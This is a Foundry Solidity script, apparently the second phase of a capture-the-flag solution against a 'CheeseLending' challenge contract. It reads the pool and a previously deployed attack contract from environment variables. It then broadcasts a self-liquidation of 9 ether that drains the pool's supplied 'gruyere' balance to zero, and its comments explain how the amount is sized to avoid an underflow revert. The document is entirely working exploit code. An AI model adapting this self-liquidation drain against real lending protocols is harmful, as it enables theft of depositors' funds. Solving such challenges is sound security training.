// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import {CheeseLending} from "targets/cheese_lending/src/CheeseLending.sol";
import {Cheese} from "targets/cheese_lending/src/Cheese.sol";
import {CheeseAttack} from "src/cheese_lending/CheeseAttack.sol";

/// @title Cheese Lending — Phase 2
/// @notice Self-liquidates the position opened in Phase1, draining
///         totalSupplied[gruyere] to zero, then calls solve().
///
/// Required env:
///   CHALLENGE — address of the deployed CheeseLending (the challenge target)
///   ATTACK    — address of the CheeseAttack deployed in Phase1
contract Phase2 is Script {
    function run() external {
        address pool_   = vm.envAddress("CHALLENGE");
        address attack_ = vm.envAddress("ATTACK");

        CheeseLending pool = CheeseLending(pool_);
        CheeseAttack attack = CheeseAttack(attack_);
        Cheese emm = Cheese(pool.assets(1));

        // We pass a FIXED amount = 9 ether (not full debt). liquidate() caps
        // amount to userDebt internally, so excess accrual is harmless — but we
        // can't let `amount` itself balloon past 9e18 or the computed collateral
        // (2.2 · amount) overflows totalSupplied[gruy]=19.8e18 and the drain
        // reverts with underflow.
        uint256 accrued = pool.getDebt(address(attack), address(emm));
        console.log("Accrued emm debt:", accrued);
        require(accrued >= 9 ether, "debt not accrued enough, wait longer");

        vm.startBroadcast();
        attack.liquidateSelf(9 ether);
        attack.finalize();
        vm.stopBroadcast();

        console.log("isSolved:", pool.isSolved());
    }
}
